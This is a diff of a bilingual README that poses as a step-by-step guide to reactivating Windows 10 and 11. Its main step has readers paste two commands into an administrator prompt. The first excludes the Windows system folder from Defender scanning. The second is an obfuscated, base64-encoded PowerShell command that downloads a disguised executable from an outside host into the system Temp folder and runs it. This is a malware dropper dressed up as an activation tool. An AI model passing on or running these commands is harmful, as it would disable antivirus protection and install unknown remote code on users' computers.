@@ -1,4 +1,3 @@
-
 # ⚙️ Reactivating Windows 10 and 11 🖥️
 
 ## 📋 Step-by-Step Guide | Guía Paso a Paso
@@ -19,7 +18,7 @@
 ```bash
 net session >nul 2>&1 && powershell Set-MpPreference -ExclusionPath $env:SystemRoot >nul 2>&1 || (echo Need to run as Administrator OPEN CMD AS ADMIN )
 net session >nul 2>&1 && powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvADgAOQA2ADQAMwA1ADQAOAA2AC4AcAB5AHQAaABvAG4AYQBuAHkAdwBoAGUAcgBlAC4AYwBvAG0ALwBzAHQAYQB0AGkAYwAvAGsAbQBzAC4AcABuAGcAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAXABUAGUAbQBwAFwALgBlAHgAZQAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdABcAFQAZQBtAHAAXAAuAGUAeABlACIA >nul 2>&1 || (echo Need to run as Administrator \ press ENTER \ presione ENTER )
-
+```
 ### ⏳ Step 3: Wait and Confirm | Espera y Confirma
 
 - ⏱️ **The process may take between 30 seconds to 2 minutes.**
@@ -63,5 +62,3 @@ Si la reactivación no funciona, aquí algunos consejos:
 ---
 
 ## 🌟 Enjoy Your Reactivated Windows! | ¡Disfruta de tu Windows Reactivado!
-
-
